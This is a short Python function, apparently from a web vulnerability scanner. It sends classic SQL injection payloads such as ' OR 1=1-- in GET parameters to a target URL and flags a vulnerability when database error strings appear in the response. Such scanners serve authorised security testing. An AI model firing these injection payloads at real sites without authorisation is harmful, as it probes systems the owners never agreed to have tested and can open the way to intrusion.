import requests
from utils import generate_test_cases

def test_sqli(target):
    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR \"1\"=\"1"
    ]

    errors = [
        "sql syntax",
        "sqlite",
        "syntax error",
        "unrecognized token",
        "near"
    ]

    for payload in payloads:
        test_cases = generate_test_cases(target["inputs"], payload)

        for data in test_cases:
            try:
                response = requests.get(
                    target["url"],
                    params=data,
                    timeout=5
                )

                print("[+] Testing:", response.url)

            except:
                continue

            for error in errors:
                if error in response.text.lower():
                    print("\n[!!!] SQL Injection Vulnerability Found")
                    print("URL:", response.url)
                    print("Payload:", payload)
                    print("Parameter:", data)

                    return True

    return False
